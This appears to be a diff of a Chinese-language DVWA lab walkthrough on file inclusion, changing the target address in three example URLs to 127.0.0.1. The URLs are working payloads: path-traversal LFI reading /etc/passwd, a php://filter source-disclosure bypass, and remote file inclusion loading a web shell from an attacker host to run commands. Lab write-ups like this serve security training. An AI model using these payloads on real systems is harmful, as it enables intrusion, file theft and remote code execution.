@@ -159,7 +159,7 @@ Payload：
 ### 1. 确认 LFI
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
 ```
 
 页面显示 `/etc/passwd` 内容，说明 LFI 绕过成功。
@@ -167,7 +167,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=....//....//....//....//etc/passwd
 ### 2. 读取源码
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-encode/resource=index.php
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-encode/resource=index.php
 ```
 
 得到 Base64 编码的源码。
@@ -183,7 +183,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=phphp://p://filter/convert.base64-
 放在 Web 目录，然后：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=hthttp://tp://攻击者IP/shell.txt&cmd=whoami
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=hthttp://tp://攻击者IP/shell.txt&cmd=whoami
 ```
 
 成功执行命令。
